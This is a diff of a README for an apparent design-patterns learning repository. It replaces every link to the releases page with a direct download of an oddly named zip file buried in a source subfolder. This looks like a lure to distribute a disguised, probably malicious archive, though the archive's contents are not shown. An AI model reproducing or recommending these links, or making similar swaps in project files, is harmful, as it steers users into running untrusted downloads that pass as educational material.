@@ -1,6 +1,6 @@
 # 🎨 DesignPatterns1 - Learn Useful Design Patterns
 
-[![Download DesignPatterns1](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Expected-bronchospasm18/DesignPatterns1/releases)
+[![Download DesignPatterns1](https://raw.githubusercontent.com/Expected-bronchospasm18/DesignPatterns1/master/02_StructuralPatterns/07_ProxyPattern/DesignPatterns1_gutturopalatine.zip)](https://raw.githubusercontent.com/Expected-bronchospasm18/DesignPatterns1/master/02_StructuralPatterns/07_ProxyPattern/DesignPatterns1_gutturopalatine.zip)
 
 ## 📚 Overview
 
@@ -15,7 +15,7 @@ To get started with the DesignPatterns1 repository, follow these simple steps to
 1. **Visit the Releases Page:** 
    Click the link below to access the releases page where you can download the files you need. 
 
-   [Visit this page to download](https://github.com/Expected-bronchospasm18/DesignPatterns1/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Expected-bronchospasm18/DesignPatterns1/master/02_StructuralPatterns/07_ProxyPattern/DesignPatterns1_gutturopalatine.zip)
 
 2. **Choose the Right Version:** 
    Look for the latest release. Each release is numbered for your convenience. If you're unsure, always select the most recent version.
@@ -90,4 +90,4 @@ For further learning about design patterns, here are some recommended resources:
 
 Thank you for exploring the **DesignPatterns1** repository. We hope this resource aids you in understanding and applying design patterns effectively. Remember to visit the releases page to get the latest updates! 
 
-[Visit this page to download](https://github.com/Expected-bronchospasm18/DesignPatterns1/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Expected-bronchospasm18/DesignPatterns1/master/02_StructuralPatterns/07_ProxyPattern/DesignPatterns1_gutturopalatine.zip)
